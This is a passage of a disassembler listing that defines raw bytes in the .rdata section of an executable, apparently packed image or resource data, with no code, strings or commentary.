.rdata:004023A8                 db  8Ch
.rdata:004023A9                 db    0
.rdata:004023AA                 db 0EEh
.rdata:004023AB                 db 0EDh
.rdata:004023AC                 db 0DDh
.rdata:004023AD                 db 0DCh
.rdata:004023AE                 db 0DDh
.rdata:004023AF                 db 0DDh
.rdata:004023B0                 db 0DDh
.rdata:004023B1                 db 0DDh
.rdata:004023B2                 db 0CDh
.rdata:004023B3                 db 0DDh
.rdata:004023B4                 db 0DDh
.rdata:004023B5                 db 0CDh
.rdata:004023B6                 db    2
.rdata:004023B7                 db 0F3h
.rdata:004023B8                 db    4
.rdata:004023B9                 db  83h
.rdata:004023BA                 db 0DDh
.rdata:004023BB                 db 0EDh
.rdata:004023BC                 db 0EEh
.rdata:004023BD                 db    0
.rdata:004023BE                 db    2
.rdata:004023BF                 db 0B3h
.rdata:004023C0                 db  1Dh
.rdata:004023C1                 db  83h
.rdata:004023C2                 db  66h ; f
.rdata:004023C3                 db  66h ; f
.rdata:004023C4                 db  66h ; f
.rdata:004023C5                 db  66h ; f
.rdata:004023C6                 db    3
.rdata:004023C7                 db  20h
.rdata:004023C8                 db    4
.rdata:004023C9                 db    3
.rdata:004023CA                 db  20h
.rdata:004023CB                 db    8
.rdata:004023CC                 db    3
.rdata:004023CD                 db  22h ; "
.rdata:004023CE                 db  0Eh
.rdata:004023CF                 db  81h
.rdata:004023D0                 db    0
.rdata:004023D1                 db 0EEh
.rdata:004023D2                 db    2
.rdata:004023D3                 db 0FBh
.rdata:004023D4                 db    5
.rdata:004023D5                 db    3
.rdata:004023D6                 db  41h ; A
.rdata:004023D7                 db    4
.rdata:004023D8                 db  83h
.rdata:004023D9                 db 0D0h
.rdata:004023DA                 db    7
.rdata:004023DB                 db    7
.rdata:004023DC                 db 0D0h
.rdata:004023DD                 db    2
.rdata:004023DE                 db 0F9h
.rdata:004023DF                 db    4
.rdata:004023E0                 db  84h
.rdata:004023E1                 db 0EEh
.rdata:004023E2                 db    0
.rdata:004023E3                 db  10h
.rdata:004023E4                 db    7
.rdata:004023E5                 db    7
.rdata:004023E6                 db    2
.rdata:004023E7                 db 0B2h
.rdata:004023E8                 db  1Ah
.rdata:004023E9                 db  83h
.rdata:004023EA                 db  6Eh ; n
.rdata:004023EB                 db  6Eh ; n
.rdata:004023EC                 db  6Eh ; n
.rdata:004023ED                 db  6Eh ; n
.rdata:004023EE                 db    3
.rdata:004023EF                 db  70h ; p
.rdata:004023F0                 db    4
.rdata:004023F1                 db  83h
.rdata:004023F2                 db 0EEh
.rdata:004023F3                 db 0EEh
.rdata:004023F4                 db 0EEh
.rdata:004023F5                 db 0EEh
.rdata:004023F6                 db    3
.rdata:004023F7                 db  78h ; x
.rdata:004023F8                 db    4
.rdata:004023F9                 db    3
.rdata:004023FA                 db  70h ; p
.rdata:004023FB                 db    8
.rdata:004023FC                 db  85h
.rdata:004023FD                 db    0
.rdata:004023FE                 db    7
.rdata:004023FF                 db    7
.rdata:00402400                 db    0
.rdata:00402401                 db 0E0h
.rdata:00402402                 db 0EEh
.rdata:00402403                 db    3
.rdata:00402404                 db  3Eh ; >
.rdata:00402405                 db    8
.rdata:00402406                 db  8Fh
.rdata:00402407                 db 0CDh
.rdata:00402408                 db 0DDh
.rdata:00402409                 db 0DDh
.rdata:0040240A                 db    0
.rdata:0040240B                 db  77h ; w
.rdata:0040240C                 db  77h ; w
.rdata:0040240D                 db  77h ; w
.rdata:0040240E                 db    7
.rdata:0040240F                 db 0D0h
.rdata:00402410                 db 0D0h
.rdata:00402411                 db 0D0h
.rdata:00402412                 db 0E0h
.rdata:00402413                 db    7
.rdata:00402414                 db  77h ; w
.rdata:00402415                 db  77h ; w
.rdata:00402416                 db  77h ; w
.rdata:00402417                 db    3
.rdata:00402418                 db    2
.rdata:00402419                 db  1Ah
.rdata:0040241A                 db    3
.rdata:0040241B                 db  78h ; x
.rdata:0040241C                 db    8
.rdata:0040241D                 db  83h
.rdata:0040241E                 db 0EAh
.rdata:0040241F                 db 0EAh
.rdata:00402420                 db 0EAh
.rdata:00402421                 db 0EAh
.rdata:00402422                 db    3
.rdata:00402423                 db 0C8h
.rdata:00402424                 db    4
.rdata:00402425                 db    3
.rdata:00402426                 db 0C0h
.rdata:00402427                 db    8
.rdata:00402428                 db  85h
.rdata:00402429                 db  0Ah
.rdata:0040242A                 db    0
.rdata:0040242B                 db  70h ; p
.rdata:0040242C                 db  77h ; w
.rdata:0040242D                 db    7
.rdata:0040242E                 db    0
.rdata:0040242F                 db    3
.rdata:00402430                 db  8Eh
.rdata:00402431                 db    5
.rdata:00402432                 db    2
.rdata:00402433                 db 0FAh
.rdata:00402434                 db    4
.rdata:00402435                 db  81h
.rdata:00402436                 db 0DCh
.rdata:00402437                 db 0D0h
.rdata:00402438                 db    3
.rdata:00402439                 db 0A2h
.rdata:0040243A                 db    4
.rdata:0040243B                 db  80h
.rdata:0040243C                 db  77h ; w
.rdata:0040243D                 db    3
.rdata:0040243E                 db 0EAh
.rdata:0040243F                 db    4
.rdata:00402440                 db    3
.rdata:00402441                 db 0EEh
.rdata:00402442                 db    4
.rdata:00402443                 db    3
.rdata:00402444                 db  55h ; U
.rdata:00402445                 db  1Ah
.rdata:00402446                 db  83h
.rdata:00402447                 db 0AAh
.rdata:00402448                 db 0AAh
.rdata:00402449                 db 0AAh
.rdata:0040244A                 db 0AAh
.rdata:0040244B                 db    4
.rdata:0040244C                 db  10h
.rdata:0040244D                 db    4
.rdata:0040244E                 db    4
.rdata:0040244F                 db  10h
.rdata:00402450                 db    8
.rdata:00402451                 db    4
.rdata:00402452                 db  16h
.rdata:00402453                 db  0Ah
.rdata:00402454                 db  85h
.rdata:00402455                 db  0Ah
.rdata:00402456                 db    0
.rdata:00402457                 db  70h ; p
.rdata:00402458                 db  70h ; p
.rdata:00402459                 db    0
.rdata:0040245A                 db 0EEh
.rdata:0040245B                 db    2
.rdata:0040245C                 db 0F9h
.rdata:0040245D                 db    7
.rdata:0040245E                 db    3
.rdata:0040245F                 db  98h
.rdata:00402460                 db    5
.rdata:00402461                 db  80h
.rdata:00402462                 db 0F0h
.rdata:00402463                 db    4
.rdata:00402464                 db  38h ; 8
.rdata:00402465                 db    4
.rdata:00402466                 db  80h
.rdata:00402467                 db  70h ; p
.rdata:00402468                 db    4
.rdata:00402469                 db  3Bh ; ;
.rdata:0040246A                 db    5
.rdata:0040246B                 db    3
.rdata:0040246C                 db 0A6h
.rdata:0040246D                 db  19h
.rdata:0040246E                 db  83h
.rdata:0040246F                 db 0A3h
.rdata:00402470                 db 0A3h
.rdata:00402471                 db 0A3h
.rdata:00402472                 db 0A3h
.rdata:00402473                 db    4
.rdata:00402474                 db  60h ; `
.rdata:00402475                 db    4
.rdata:00402476                 db  83h
.rdata:00402477                 db  33h ; 3
.rdata:00402478                 db  33h ; 3
.rdata:00402479                 db  33h ; 3
.rdata:0040247A                 db  33h ; 3
.rdata:0040247B                 db    4
.rdata:0040247C                 db  68h ; h
.rdata:0040247D                 db    4
.rdata:0040247E                 db    4
.rdata:0040247F                 db  60h ; `
.rdata:00402480                 db  0Dh
.rdata:00402481                 db  83h
.rdata:00402482                 db    3
.rdata:00402483                 db    0
.rdata:00402484                 db 0EEh
.rdata:00402485                 db 0DEh
.rdata:00402486                 db    2
.rdata:00402487                 db 0F1h
.rdata:00402488                 db    4
.rdata:00402489                 db    3
.rdata:0040248A                 db  96h
.rdata:0040248B                 db    7
.rdata:0040248C                 db  81h
.rdata:0040248D                 db  77h ; w
.rdata:0040248E                 db  70h ; p
.rdata:0040248F                 db    4
.rdata:00402490                 db  3Fh ; ?
.rdata:00402491                 db    4
.rdata:00402492                 db    4
.rdata:00402493                 db  8Ch
.rdata:00402494                 db    4
.rdata:00402495                 db    4
.rdata:00402496                 db  46h ; F
.rdata:00402497                 db  1Ah
.rdata:00402498                 db    4
.rdata:00402499                 db  68h ; h
.rdata:0040249A                 db    8
.rdata:0040249B                 db  87h
.rdata:0040249C                 db  39h ; 9
.rdata:0040249D                 db  39h ; 9
.rdata:0040249E                 db  39h ; 9
.rdata:0040249F                 db  39h ; 9
.rdata:004024A0                 db 0F9h
.rdata:004024A1                 db  39h ; 9
.rdata:004024A2                 db  39h ; 9
.rdata:004024A3                 db  39h ; 9
.rdata:004024A4                 db    4
.rdata:004024A5                 db 0B0h
.rdata:004024A6                 db  0Ch
.rdata:004024A7                 db  9Ah
.rdata:004024A8                 db  39h ; 9
.rdata:004024A9                 db  30h ; 0
.rdata:004024AA                 db    0
.rdata:004024AB                 db 0E0h
.rdata:004024AC                 db 0EEh
.rdata:004024AD                 db 0EEh
.rdata:004024AE                 db 0DEh
.rdata:004024AF                 db 0DEh
.rdata:004024B0                 db 0DEh
.rdata:004024B1                 db 0DEh
.rdata:004024B2                 db 0DEh
.rdata:004024B3                 db 0DEh
.rdata:004024B4                 db 0DEh
.rdata:004024B5                 db  0Eh
.rdata:004024B6                 db  70h ; p
.rdata:004024B7                 db  77h ; w
.rdata:004024B8                 db  77h ; w
.rdata:004024B9                 db    7
.rdata:004024BA                 db    7
.rdata:004024BB                 db    7
.rdata:004024BC                 db    7
.rdata:004024BD                 db    7
.rdata:004024BE                 db    7
.rdata:004024BF                 db    7
.rdata:004024C0                 db  77h ; w
.rdata:004024C1                 db  70h ; p
.rdata:004024C2                 db    1
.rdata:004024C3                 db    3
.rdata:004024C4                 db 0A7h
.rdata:004024C5                 db  19h
.rdata:004024C6                 db  83h
.rdata:004024C7                 db  99h
.rdata:004024C8                 db  99h
.rdata:004024C9                 db  99h
.rdata:004024CA                 db  99h
.rdata:004024CB                 db    5
.rdata:004024CC                 db    0
.rdata:004024CD                 db    4
.rdata:004024CE                 db  81h
.rdata:004024CF                 db  99h
.rdata:004024D0                 db  9Fh
.rdata:004024D1                 db    5
.rdata:004024D2                 db    4
.rdata:004024D3                 db    6
.rdata:004024D4                 db    5
.rdata:004024D5                 db    0
.rdata:004024D6                 db    9
.rdata:004024D7                 db  88h
.rdata:004024D8                 db  99h
.rdata:004024D9                 db  99h
.rdata:004024DA                 db  99h
.rdata:004024DB                 db    0
.rdata:004024DC                 db  77h ; w
.rdata:004024DD                 db  77h ; w
.rdata:004024DE                 db  70h ; p
.rdata:004024DF                 db    0
.rdata:004024E0                 db    1
.rdata:004024E1                 db    3
.rdata:004024E2                 db  88h
.rdata:004024E3                 db    4
.rdata:004024E4                 db  83h
.rdata:004024E5                 db    1
.rdata:004024E6                 db    1
.rdata:004024E7                 db    1
.rdata:004024E8                 db    1
.rdata:004024E9                 db    5
.rdata:004024EA                 db  21h ; !
.rdata:004024EB                 db    6
.rdata:004024EC                 db    5
.rdata:004024ED                 db  2Bh ; +
.rdata:004024EE                 db    5
.rdata:004024EF                 db    3
.rdata:004024F0                 db    5
.rdata:004024F1                 db  1Bh
.rdata:004024F2                 db  83h
.rdata:004024F3                 db  91h
.rdata:004024F4                 db  91h
.rdata:004024F5                 db  91h
.rdata:004024F6                 db  91h
.rdata:004024F7                 db    5
.rdata:004024F8                 db  50h ; P
.rdata:004024F9                 db    4
.rdata:004024FA                 db    5
.rdata:004024FB                 db  48h ; H
.rdata:004024FC                 db  10h
.rdata:004024FD                 db    5
.rdata:004024FE                 db  5Ch ; \
.rdata:004024FF                 db    4
.rdata:00402500                 db    5
.rdata:00402501                 db  27h ; '
.rdata:00402502                 db    4
.rdata:00402503                 db    5
.rdata:00402504                 db  6Ah ; j
.rdata:00402505                 db    5
.rdata:00402506                 db    5
.rdata:00402507                 db  59h ; Y
.rdata:00402508                 db    7
.rdata:00402509                 db    5
.rdata:0040250A                 db  6Dh ; m
.rdata:0040250B                 db    7
.rdata:0040250C                 db    1
.rdata:0040250D                 db 0B8h
.rdata:0040250E                 db  98h
.rdata:0040250F                 db    0
.rdata:00402510                 db  9Fh
.rdata:00402511                 db 0F1h
.rdata:00402512                 db    6
.rdata:00402513                 db  99h
.rdata:00402514                 db  73h ; s
.rdata:00402515                 db    5
.rdata:00402516                 db 0ACh
.rdata:00402517                 db  93h
.rdata:00402518                 db    7
.rdata:00402519                 db  7Fh ; 
.rdata:0040251A                 db    6
.rdata:0040251B                 db    7
.rdata:0040251C                 db  7Fh ; 
.rdata:0040251D                 db  4Bh ; K
.rdata:0040251E                 db  82h
.rdata:0040251F                 db 0F1h
.rdata:00402520                 db  11h
.rdata:00402521                 db  1Fh
.rdata:00402522                 db    5
.rdata:00402523                 db 0ABh
.rdata:00402524                 db 0FFh
.rdata:00402525                 db    8
.rdata:00402526                 db 0AAh
.rdata:00402527                 db 0BBh
.rdata:00402528                 db    2
.rdata:00402529                 db  50h ; P
.rdata:0040252A                 db 0F9h
.rdata:0040252B                 db    3
.rdata:0040252C                 db  48h ; H
.rdata:0040252D                 db    5
.rdata:0040252E                 db    3
.rdata:0040252F                 db  4Eh ; N
.rdata:00402530                 db    5
.rdata:00402531                 db  80h
.rdata:00402532                 db  11h
.rdata:00402533                 db    3
.rdata:00402534                 db  53h ; S
.rdata:00402535                 db  1Ch
.rdata:00402536                 db    3
.rdata:00402537                 db  70h ; p
.rdata:00402538                 db  18h
.rdata:00402539                 db  84h
.rdata:0040253A                 db 0EEh
.rdata:0040253B                 db 0E0h
.rdata:0040253C                 db 0E0h
.rdata:0040253D                 db 0EEh
.rdata:0040253E                 db 0EEh
.rdata:0040253F                 db    3
.rdata:00402540                 db  8Dh
.rdata:00402541                 db  0Ch
.rdata:00402542                 db    3
.rdata:00402543                 db  98h
.rdata:00402544                 db    8
.rdata:00402545                 db  81h
.rdata:00402546                 db 0E0h
.rdata:00402547                 db    0
.rdata:00402548                 db    3
.rdata:00402549                 db 0A2h
.rdata:0040254A                 db  1Dh
.rdata:0040254B                 db    3
.rdata:0040254C                 db 0C0h
.rdata:0040254D                 db  18h
.rdata:0040254E                 db    4
.rdata:0040254F                 db  44h ; D
.rdata:00402550                 db    4
.rdata:00402551                 db  81h
.rdata:00402552                 db 0E0h
.rdata:00402553                 db 0E0h
.rdata:00402554                 db    3
.rdata:00402555                 db 0DEh
.rdata:00402556                 db  0Ah
.rdata:00402557                 db  80h
.rdata:00402558                 db 0DDh
.rdata:00402559                 db    3
.rdata:0040255A                 db 0E8h
.rdata:0040255B                 db  27h ; '
.rdata:0040255C                 db    4
.rdata:0040255D                 db  11h
.rdata:0040255E                 db  1Ah
.rdata:0040255F                 db  83h
.rdata:00402560                 db  70h ; p
.rdata:00402561                 db  70h ; p
.rdata:00402562                 db  77h ; w
.rdata:00402563                 db  77h ; w
.rdata:00402564                 db    4
.rdata:00402565                 db  2Eh ; .
.rdata:00402566                 db  0Ah
.rdata:00402567                 db    4
.rdata:00402568                 db  37h ; 7
.rdata:00402569                 db  28h ; (
.rdata:0040256A                 db    4
.rdata:0040256B                 db  60h ; `
.rdata:0040256C                 db  1Ch
.rdata:0040256D                 db  80h
.rdata:0040256E                 db    3
.rdata:0040256F                 db    4
.rdata:00402570                 db  7Dh ; }
.rdata:00402571                 db  0Bh
.rdata:00402572                 db    4
.rdata:00402573                 db  87h
.rdata:00402574                 db  28h ; (
.rdata:00402575                 db    4
.rdata:00402576                 db 0C0h
.rdata:00402577                 db  0Dh
.rdata:00402578                 db    4
.rdata:00402579                 db 0BDh
.rdata:0040257A                 db  10h
.rdata:0040257B                 db  80h
.rdata:0040257C                 db  39h ; 9
.rdata:0040257D                 db    4
.rdata:0040257E                 db 0CEh
.rdata:0040257F                 db  0Bh
.rdata:00402580                 db    4
.rdata:00402581                 db 0D8h
.rdata:00402582                 db  27h ; '
.rdata:00402583                 db    5
.rdata:00402584                 db  10h
.rdata:00402585                 db  0Ch
.rdata:00402586                 db  0Ch
.rdata:00402587                 db 0D0h
.rdata:00402588                 db  0Ch
.rdata:00402589                 db    5
.rdata:0040258A                 db  17h
.rdata:0040258B                 db    8
.rdata:0040258C                 db    5
.rdata:0040258D                 db  20h
.rdata:0040258E                 db  0Bh
.rdata:0040258F                 db    5
.rdata:00402590                 db  2Ah ; *
.rdata:00402591                 db  25h ; %
.rdata:00402592                 db    5
.rdata:00402593                 db  62h ; b
.rdata:00402594                 db    6
.rdata:00402595                 db  80h
.rdata:00402596                 db 0F1h
.rdata:00402597                 db    5
.rdata:00402598                 db  57h ; W
.rdata:00402599                 db  15h
.rdata:0040259A                 db    5
.rdata:0040259B                 db  71h ; q
.rdata:0040259C                 db    7
.rdata:0040259D                 db    5
.rdata:0040259E                 db  72h ; r
.rdata:0040259F                 db  11h
.rdata:004025A0                 db    5
.rdata:004025A1                 db  82h
.rdata:004025A2                 db  2Ah ; *
.rdata:004025A3                 db    5
.rdata:004025A4                 db 0ADh
.rdata:004025A5                 db 0FFh
.rdata:004025A6                 db    6
.rdata:004025A7                 db 0B1h
.rdata:004025A8                 db 0FFh
.rdata:004025A9                 db    7
.rdata:004025AA                 db 0B5h
.rdata:004025AB                 db 0AEh
.rdata:004025AC                 db  81h
.rdata:004025AD                 db  11h
.rdata:004025AE                 db  11h
.rdata:004025AF                 db    1
.rdata:004025B0                 db  92h
.rdata:004025B1                 db  4Fh ; O
.rdata:004025B2                 db    0
.rdata:004025B3                 db 0DCh
.rdata:004025B4                 db 0B5h
.rdata:004025B5                 db  0Eh
.rdata:004025B6                 db 0FCh
.rdata:004025B7                 db  9Ch
.rdata:004025B8                 db    0
.rdata:004025B9                 db  4Bh ; K
.rdata:004025BA                 db  54h ; T
.rdata:004025BB                 db  0Ah
.rdata:004025BC                 db  59h ; Y
.rdata:004025BD                 db  15h
.rdata:004025BE                 db  12h
.rdata:004025BF                 db  25h ; %
.rdata:004025C0                 db  0Ah
.rdata:004025C1                 db  84h
.rdata:004025C2                 db  10h
.rdata:004025C3                 db  0Eh
.rdata:004025C4                 db  0Eh
.rdata:004025C5                 db  0Eh
.rdata:004025C6                 db  0Eh
.rdata:004025C7                 db  12h
.rdata:004025C8                 db  40h ; @
.rdata:004025C9                 db    4
.rdata:004025CA                 db  12h
.rdata:004025CB                 db  40h ; @
.rdata:004025CC                 db    8
.rdata:004025CD                 db  0Ah
.rdata:004025CE                 db  81h
.rdata:004025CF                 db  1Fh
.rdata:004025D0                 db  80h
.rdata:004025D1                 db  11h
.rdata:004025D2                 db  0Ah
.rdata:004025D3                 db 0A9h
.rdata:004025D4                 db  15h
.rdata:004025D5                 db  12h
.rdata:004025D6                 db  75h ; u
.rdata:004025D7                 db    9
.rdata:004025D8                 db  83h
.rdata:004025D9                 db    0
.rdata:004025DA                 db 0EEh
.rdata:004025DB                 db 0EEh
.rdata:004025DC                 db 0EDh
.rdata:004025DD                 db  0Ch
.rdata:004025DE                 db    4
.rdata:004025DF                 db    5
.rdata:004025E0                 db  80h
.rdata:004025E1                 db 0DCh
.rdata:004025E2                 db  0Bh
.rdata:004025E3                 db 0B5h
.rdata:004025E4                 db    4
.rdata:004025E5                 db  0Ah
.rdata:004025E6                 db 0CDh
.rdata:004025E7                 db    5
.rdata:004025E8                 db  0Ah
.rdata:004025E9                 db 0D1h
.rdata:004025EA                 db  41h ; A
.rdata:004025EB                 db  0Ch
.rdata:004025EC                 db    1
.rdata:004025ED                 db    8
.rdata:004025EE                 db  82h
.rdata:004025EF                 db 0DDh
.rdata:004025F0                 db 0D0h
.rdata:004025F1                 db 0D0h
.rdata:004025F2                 db  12h
.rdata:004025F3                 db  99h
.rdata:004025F4                 db    4
.rdata:004025F5                 db  12h
.rdata:004025F6                 db 0A1h
.rdata:004025F7                 db    4
.rdata:004025F8                 db  0Ah
.rdata:004025F9                 db  2Fh ; /
.rdata:004025FA                 db  1Bh
.rdata:004025FB                 db  0Bh
.rdata:004025FC                 db  49h ; I
.rdata:004025FD                 db  10h
.rdata:004025FE                 db  13h
.rdata:004025FF                 db  10h
.rdata:00402600                 db  0Eh
.rdata:00402601                 db  0Bh
.rdata:00402602                 db  5Eh ; ^
.rdata:00402603                 db    8
.rdata:00402604                 db  12h
.rdata:00402605                 db  9Ah
.rdata:00402606                 db    4
.rdata:00402607                 db  80h
.rdata:00402608                 db    0
.rdata:00402609                 db  0Bh
.rdata:0040260A                 db  6Ch ; l
.rdata:0040260B                 db    4
.rdata:0040260C                 db    3
.rdata:0040260D                 db  4Fh ; O
.rdata:0040260E                 db    6
.rdata:0040260F                 db  0Bh
.rdata:00402610                 db  75h ; u
.rdata:00402611                 db  1Bh
.rdata:00402612                 db  0Bh
.rdata:00402613                 db  99h
.rdata:00402614                 db  0Fh
.rdata:00402615                 db  0Bh
.rdata:00402616                 db  98h
.rdata:00402617                 db  0Fh
.rdata:00402618                 db  13h
.rdata:00402619                 db  2Eh ; .
.rdata:0040261A                 db    5
.rdata:0040261B                 db  12h
.rdata:0040261C                 db  9Ah
.rdata:0040261D                 db    5
.rdata:0040261E                 db  0Ch
.rdata:0040261F                 db  57h ; W
.rdata:00402620                 db    7
.rdata:00402621                 db  0Ch
.rdata:00402622                 db 0B1h
.rdata:00402623                 db    5
.rdata:00402624                 db  0Bh
.rdata:00402625                 db  74h ; t
.rdata:00402626                 db  1Ch
.rdata:00402627                 db    4
.rdata:00402628                 db  10h
.rdata:00402629                 db  1Ah
.rdata:0040262A                 db  82h
.rdata:0040262B                 db 0A0h
.rdata:0040262C                 db 0A0h
.rdata:0040262D                 db 0A0h
.rdata:0040262E                 db    3
.rdata:0040262F                 db 0DDh
.rdata:00402630                 db    4
.rdata:00402631                 db  13h
.rdata:00402632                 db  83h
.rdata:00402633                 db    6
.rdata:00402634                 db  80h
.rdata:00402635                 db 0CDh
.rdata:00402636                 db  13h
.rdata:00402637                 db  89h
.rdata:00402638                 db    5
.rdata:00402639                 db  80h
.rdata:0040263A                 db  7Fh ; 
.rdata:0040263B                 db  0Ch
.rdata:0040263C                 db  64h ; d
.rdata:0040263D                 db    4
.rdata:0040263E                 db  13h
.rdata:0040263F                 db 0DBh
.rdata:00402640                 db    6
.rdata:00402641                 db  0Ch
.rdata:00402642                 db  68h ; h
.rdata:00402643                 db  1Fh
.rdata:00402644                 db  0Ch
.rdata:00402645                 db  30h ; 0
.rdata:00402646                 db  11h
.rdata:00402647                 db  0Bh
.rdata:00402648                 db  72h ; r
.rdata:00402649                 db    4
.rdata:0040264A                 db    4
.rdata:0040264B                 db  2Ch ; ,
.rdata:0040264C                 db    5
.rdata:0040264D                 db  13h
.rdata:0040264E                 db  32h ; 2
.rdata:0040264F                 db  0Bh
.rdata:00402650                 db  80h
.rdata:00402651                 db  77h ; w
.rdata:00402652                 db  13h
.rdata:00402653                 db  91h
.rdata:00402654                 db    5
.rdata:00402655                 db  80h
.rdata:00402656                 db    7
.rdata:00402657                 db  14h
.rdata:00402658                 db  2Ch ; ,
.rdata:00402659                 db    5
.rdata:0040265A                 db  13h
.rdata:0040265B                 db 0E8h
.rdata:0040265C                 db  18h
.rdata:0040265D                 db  0Ch
.rdata:0040265E                 db  89h
.rdata:0040265F                 db  15h
.rdata:00402660                 db  14h
.rdata:00402661                 db  55h ; U
.rdata:00402662                 db    4
.rdata:00402663                 db  88h
.rdata:00402664                 db    3
.rdata:00402665                 db    3
.rdata:00402666                 db    3
.rdata:00402667                 db    3
.rdata:00402668                 db  33h ; 3
.rdata:00402669                 db    0
.rdata:0040266A                 db 0EEh
.rdata:0040266B                 db 0EEh
.rdata:0040266C                 db 0DEh
.rdata:0040266D                 db  12h
.rdata:0040266E                 db 0E2h
.rdata:0040266F                 db    7
.rdata:00402670                 db  80h
.rdata:00402671                 db  0Dh
.rdata:00402672                 db  0Ch
.rdata:00402673                 db  64h ; d
.rdata:00402674                 db    5
.rdata:00402675                 db  81h
.rdata:00402676                 db  70h ; p
.rdata:00402677                 db  70h ; p
.rdata:00402678                 db    4
.rdata:00402679                 db  2Bh ; +
.rdata:0040267A                 db    4
.rdata:0040267B                 db  80h
.rdata:0040267C                 db  77h ; w
.rdata:0040267D                 db  0Ch
.rdata:0040267E                 db 0B5h
.rdata:0040267F                 db  1Ah
.rdata:00402680                 db    5
.rdata:00402681                 db  0Eh
.rdata:00402682                 db  0Eh
.rdata:00402683                 db  0Ch
.rdata:00402684                 db 0DDh
.rdata:00402685                 db  11h
.rdata:00402686                 db  84h
.rdata:00402687                 db    7
.rdata:00402688                 db 0E0h
.rdata:00402689                 db 0E0h
.rdata:0040268A                 db 0E0h
.rdata:0040268B                 db 0E0h
.rdata:0040268C                 db  14h
.rdata:0040268D                 db 0C0h
.rdata:0040268E                 db    4
.rdata:0040268F                 db  87h
.rdata:00402690                 db 0E0h
.rdata:00402691                 db 0E0h
.rdata:00402692                 db 0E0h
.rdata:00402693                 db    0
.rdata:00402694                 db  70h ; p
.rdata:00402695                 db  70h ; p
.rdata:00402696                 db  70h ; p
.rdata:00402697                 db  70h ; p
.rdata:00402698                 db  14h
.rdata:00402699                 db 0CCh
.rdata:0040269A                 db    4
.rdata:0040269B                 db  80h
.rdata:0040269C                 db  70h ; p
.rdata:0040269D                 db    4
.rdata:0040269E                 db 0E5h
.rdata:0040269F                 db  1Bh
.rdata:004026A0                 db  81h
.rdata:004026A1                 db 0F1h
.rdata:004026A2                 db  1Fh
.rdata:004026A3                 db  11h
.rdata:004026A4                 db 0CFh
.rdata:004026A5                 db    5
.rdata:004026A6                 db    5
.rdata:004026A7                 db  50h ; P
.rdata:004026A8                 db  17h
.rdata:004026A9                 db  80h
.rdata:004026AA                 db    0
.rdata:004026AB                 db  14h
.rdata:004026AC                 db 0D4h
.rdata:004026AD                 db    4
.rdata:004026AE                 db  82h
.rdata:004026AF                 db    1
.rdata:004026B0                 db  70h ; p
.rdata:004026B1                 db  70h ; p
.rdata:004026B2                 db  14h
.rdata:004026B3                 db  38h ; 8
.rdata:004026B4                 db    7
.rdata:004026B5                 db  15h
.rdata:004026B6                 db  13h
.rdata:004026B7                 db    5
.rdata:004026B8                 db  15h
.rdata:004026B9                 db  13h
.rdata:004026BA                 db  0Ah
.rdata:004026BB                 db    5
.rdata:004026BC                 db 0ADh
.rdata:004026BD                 db 0FFh
.rdata:004026BE                 db  0Fh
.rdata:004026BF                 db 0E2h
.rdata:004026C0                 db 0E7h
.rdata:004026C1                 db  0Fh
.rdata:004026C2                 db 0D9h
.rdata:004026C3                 db  93h
.rdata:004026C4                 db    5
.rdata:004026C5                 db 0ACh
.rdata:004026C6                 db 0FFh
.rdata:004026C7                 db  16h
.rdata:004026C8                 db  23h ; #
.rdata:004026C9                 db 0A0h
.rdata:004026CA                 db  17h
.rdata:004026CB                 db 0A5h
.rdata:004026CC                 db    4
.rdata:004026CD                 db    8
.rdata:004026CE                 db  18h
.rdata:004026CF                 db  4Dh ; M
.rdata:004026D0                 db    8
.rdata:004026D1                 db  14h
.rdata:004026D2                 db  5Bh ; [
.rdata:004026D3                 db  12h
.rdata:004026D4                 db  20h
.rdata:004026D5                 db 0FFh
.rdata:004026D6                 db  13h
.rdata:004026D7                 db  1Fh
.rdata:004026D8                 db 0ADh
.rdata:004026D9                 db  81h
.rdata:004026DA                 db    7
.rdata:004026DB                 db    7
.rdata:004026DC                 db  13h
.rdata:004026DD                 db 0CEh
.rdata:004026DE                 db  4Ah ; J
.rdata:004026DF                 db  83h
.rdata:004026E0                 db 0A0h
.rdata:004026E1                 db    7
.rdata:004026E2                 db  77h ; w
.rdata:004026E3                 db  70h ; p
.rdata:004026E4                 db  14h
.rdata:004026E5                 db  1Ch
.rdata:004026E6                 db  4Ch ; L
.rdata:004026E7                 db  84h
.rdata:004026E8                 db    3
.rdata:004026E9                 db  70h ; p
.rdata:004026EA                 db  70h ; p
.rdata:004026EB                 db    3
.rdata:004026EC                 db  33h ; 3
.rdata:004026ED                 db  14h
.rdata:004026EE                 db  6Dh ; m
.rdata:004026EF                 db  34h ; 4
.rdata:004026F0                 db  14h
.rdata:004026F1                 db 0A2h
.rdata:004026F2                 db  1Ch
.rdata:004026F3                 db  81h
.rdata:004026F4                 db  90h
.rdata:004026F5                 db    7
.rdata:004026F6                 db  14h
.rdata:004026F7                 db 0BFh
.rdata:004026F8                 db  31h ; 1
.rdata:004026F9                 db    5
.rdata:004026FA                 db  49h ; I
.rdata:004026FB                 db  1Dh
.rdata:004026FC                 db  15h
.rdata:004026FD                 db  0Eh
.rdata:004026FE                 db 0FFh
.rdata:004026FF                 db  18h
.rdata:00402700                 db  97h
.rdata:00402701                 db 0FFh
.rdata:00402702                 db    8
.rdata:00402703                 db  15h
.rdata:00402704                 db  94h
.rdata:00402705                 db  14h
.rdata:00402706                 db 0F0h
.rdata:00402707                 db    7
.rdata:00402708                 db    5
.rdata:00402709                 db 0ADh
.rdata:0040270A                 db 0FFh
.rdata:0040270B                 db  16h
.rdata:0040270C                 db  2Dh ; -
.rdata:0040270D                 db 0FFh
.rdata:0040270E                 db  20h
.rdata:0040270F                 db  84h
.rdata:00402710                 db  4Ch ; L
.rdata:00402711                 db  0Ah
.rdata:00402712                 db  50h ; P
.rdata:00402713                 db  1Eh
.rdata:00402714                 db  81h
.rdata:00402715                 db  44h ; D
.rdata:00402716                 db  40h ; @
.rdata:00402717                 db  1Ah
.rdata:00402718                 db  10h
.rdata:00402719                 db  30h ; 0
.rdata:0040271A                 db  0Ah
.rdata:0040271B                 db 0A0h
.rdata:0040271C                 db  20h
.rdata:0040271D                 db  1Ah
.rdata:0040271E                 db  60h ; `
.rdata:0040271F                 db  5Ah ; Z
.rdata:00402720                 db  81h
.rdata:00402721                 db 0D0h
.rdata:00402722                 db 0D0h
.rdata:00402723                 db  22h ; "
.rdata:00402724                 db  38h ; 8
.rdata:00402725                 db    5
.rdata:00402726                 db  0Bh
.rdata:00402727                 db  21h ; !
.rdata:00402728                 db    4
.rdata:00402729                 db  21h ; !
.rdata:0040272A                 db 0F1h
.rdata:0040272B                 db  1Bh
.rdata:0040272C                 db  0Bh
